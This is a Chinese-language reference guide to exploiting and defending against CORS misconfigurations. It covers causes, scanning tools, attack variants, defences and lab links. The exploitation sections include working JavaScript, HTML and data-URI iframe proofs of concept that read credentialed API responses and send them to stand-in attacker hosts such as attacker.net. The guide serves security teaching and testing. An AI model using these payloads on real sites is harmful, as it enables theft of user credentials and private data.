# CORS 配置错误 (CORS Misconfiguration)

> 当API域存在全站CORS配置错误时，由于应用程序未正确设置Origin白名单且启用了`Access-Control-Allow-Credentials: true`，攻击者可以代表用户发起跨域请求，从而窃取用户凭证和敏感数据。

## CORS 配置错误原理

跨源资源共享(CORS)是一种安全机制，它允许网页从不同的域请求资源。当服务器错误配置CORS策略时，可能导致严重的安全风险。

### 漏洞成因

1. **不安全的CORS策略**：
   - 未正确验证Origin头
   - 使用通配符`*`与凭证一起使用
   - 接受`null`源
   - 反射任意Origin

2. **错误的安全假设**：
   - 认为CORS是访问控制机制
   - 依赖浏览器同源策略作为唯一安全边界
   - 未验证预检请求

3. **开发配置泄漏**：
   - 开发环境配置泄漏到生产环境
   - 未正确区分环境和API端点的CORS策略

### 攻击面

- **凭证窃取**：窃取用户会话和认证令牌
- **敏感数据泄露**：获取API返回的敏感信息
- **内部网络探测**：利用信任的CORS策略探测内网服务
- **权限提升**：将低权限用户权限提升至高权限

### 影响

- 用户凭证泄露
- 敏感业务数据泄露
- 内部网络信息泄露
- 可能导致账户接管
- 违反数据保护法规

## 目录

- [工具](#工具)
- [前置条件](#前置条件)
- [利用方法](#利用方法)
    - [Origin反射](#origin反射)
    - [Null Origin](#null-origin)
    - [受信任源上的XSS](#受信任源上的xss)
    - [无凭证的通配符Origin](#无凭证的通配符origin)
    - [Origin扩展攻击](#origin扩展攻击)
- [实验环境](#实验环境)
- [防御措施](#防御措施)
- [参考资料](#参考资料)

## 工具

* [s0md3v/Corsy](https://github.com/s0md3v/Corsy/) - CORS错误配置扫描器
* [chenjj/CORScanner](https://github.com/chenjj/CORScanner) - 快速的CORS漏洞扫描器
* [@honoki/PostMessage](https://tools.honoki.net/postmessage.html) - POC构建工具
* [trufflesecurity/of-cors](https://github.com/trufflesecurity/of-cors) - 利用内部网络中的CORS错误配置
* [omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne) - 快速CORS错误配置发现工具

## 前置条件

* BURP HEADER> `Origin: https://evil.com`
* VICTIM HEADER> `Access-Control-Allow-Credential: true`
* VICTIM HEADER> `Access-Control-Allow-Origin: https://evil.com` 或 `Access-Control-Allow-Origin: null`

## 利用方法

### Origin反射

#### 漏洞实现

```http
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: https://evil.com
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

#### 概念验证(PoC)

此PoC要求相应的JS脚本托管在`evil.com`

```javascript
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://victim.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

或使用HTML表单：

```html
<html>
    <body>
        <h2>CORS PoC</h2>
        <div id="demo">
            <button type="button" onclick="cors()">Exploit</button>
        </div>
        <script>
            function cors() {
                var xhr = new XMLHttpRequest();
                xhr.onreadystatechange = function() {
                    if (this.readyState == 4 && this.status == 200) {
                        document.getElementById("demo").innerHTML = alert(this.responseText);
                    }
                };
                xhr.open("GET", "https://victim.example.com/endpoint", true);
                xhr.withCredentials = true;
                xhr.send();
            }
        </script>
    </body>
</html>
```

### Null Origin

#### 漏洞实现

服务器可能不会完全反射`Origin`头，但允许`null`源：

```http
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: null
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

#### 概念验证(PoC)

使用iframe的data URI方案利用此漏洞：

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://victim.example.com/endpoint',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe> 
```

### 受信任源上的XSS

如果应用程序实现了严格的白名单机制，但受信任的源上存在XSS漏洞，攻击者可以注入恶意脚本来利用CORS：

```
https://trusted-origin.example.com/?xss=<script>CORS-EXPLOIT-CODE</script>
```

### 无凭证的通配符Origin

如果服务器响应包含通配符`*`，浏览器不会发送凭据。但如果服务器不需要认证，仍然可以访问数据：

#### 漏洞实现

```http
GET /endpoint HTTP/1.1
Host: api.internal.example.com
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

{"[private API key]"}
```

#### 概念验证(PoC)

```javascript
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.internal.example.com/endpoint',true); 
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

### Origin扩展攻击

当服务器使用实现不当的正则表达式验证Origin头时，可能允许攻击者通过构造特定的Origin绕过限制。

#### 漏洞实现示例

```http
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://evilexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evilexample.com
Access-Control-Allow-Credentials: true
```

## 防御措施

1. **严格验证Origin头**：
   - 维护允许域的白名单
   - 避免使用通配符`*`
   - 拒绝`null` Origin

2. **限制凭证使用**：
   - 避免同时使用`Access-Control-Allow-Credentials: true`和通配符`*`
   - 仅在必要时启用CORS

3. **安全配置**：
   - 为不同环境设置适当的CORS策略
   - 限制允许的HTTP方法和头信息
   - 设置适当的`Access-Control-Max-Age`

4. **输入验证**：
   - 验证所有传入的Origin头
   - 实现严格的服务器端验证

5. **监控与日志**：
   - 记录所有CORS请求
   - 监控异常的跨域请求模式

## 实验环境

- [PortSwigger Web Security Academy CORS labs](https://portswigger.net/web-security/cors)
- [Hack The Box CORS challenges](https://www.hackthebox.com/)

## 参考资料

* [PortSwigger: CORS](https://portswigger.net/web-security/cors)
* [OWASP: CORS Misconfiguration](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing)
* [CORS Misconfiguration: A Bitter Sweet Story - Detectify](https://labs.detectify.com/2015/09/30/cors-misconfiguration-a-bitter-sweet-story/)
* [Exploiting CORS Misconfigurations For Bitcoins And Bounties - James Kettle](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [Think Outside the Scope: Advanced CORS Exploitation Techniques - Ayoub Safa](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)
